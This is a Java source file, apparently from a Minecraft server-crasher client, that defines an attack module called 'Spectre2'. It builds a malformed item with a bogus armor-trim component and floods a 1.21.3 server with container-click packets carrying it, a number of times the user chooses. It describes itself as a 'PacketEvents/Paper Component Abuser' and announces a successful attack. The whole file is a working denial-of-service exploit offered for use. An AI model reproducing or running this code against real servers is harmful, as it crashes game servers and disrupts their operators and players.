package us.gyatdevs.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.StringTag;
import us.gyatdevs.crashers.Crasher;
import us.gyatdevs.gui.clickgui.ClickGui;
import us.gyatdevs.protocol.GYATProtocol;
import us.gyatdevs.protocol.components.data.DataComponents;
import us.gyatdevs.protocol.components.data.impl.DataArmorTrim;
import us.gyatdevs.protocol.components.objects.ArmorMaterial;
import us.gyatdevs.protocol.components.objects.ArmorPattern;
import us.gyatdevs.protocol.components.objects.ItemStack;
import us.gyatdevs.protocol.packets.PacketCodec;
import us.gyatdevs.protocol.packets.play.PacketContainerClick;
import us.gyatdevs.utils.OptionType;
import us.gyatdevs.utils.OptionUtil;

import java.util.List;
import java.util.Map;

public class Spectre2 implements Crasher {
    private static final String METHOD_NAME = "Spectre2";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (protocol == 768) {
            CompoundTag compoundTag = new CompoundTag();
            compoundTag.put("text", new StringTag(""));

            ArmorMaterial armorMaterial = new ArmorMaterial("", 840, Map.of(":", ""), compoundTag);
            ArmorPattern armorPattern = new ArmorPattern(":", 840, compoundTag, true);

            DataComponents components = new DataComponents();
            components.put(new DataArmorTrim(armorMaterial, armorPattern, true));

            ItemStack item = new ItemStack(1233, 1, components);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    item, new Int2ObjectArrayMap<>()), packets);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.3&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[100]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "PacketEvents/Paper Component Abuser";
    }
}